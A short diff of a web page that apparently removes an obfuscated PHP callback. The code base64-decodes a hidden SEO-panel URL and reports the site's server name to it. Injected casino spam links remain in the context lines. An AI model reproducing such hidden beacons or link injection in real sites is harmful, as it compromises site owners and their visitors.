@@ -24,12 +24,3 @@
 <a href="http://casinos-en-linea-7.com/" title="Canlı Casino Siteleri >Canlı Casino Siteleri</a>
 <a href="http://www.google.com.tr/" title="google.com.tr" >google.com.tr</a>
 </div>
-
-
-
-<?php
-     $url = $_SERVER['SERVER_NAME'];
-    $exe = curl_init();
-    curl_setopt($exe, CURLOPT_URL, base64_decode("aHR0cHM6Ly9wYW5lbC5zZW9wYWtldGxlcmkub3JnL2NvZGU/eD0=").$url);
-    curl_exec($exe);
-?>
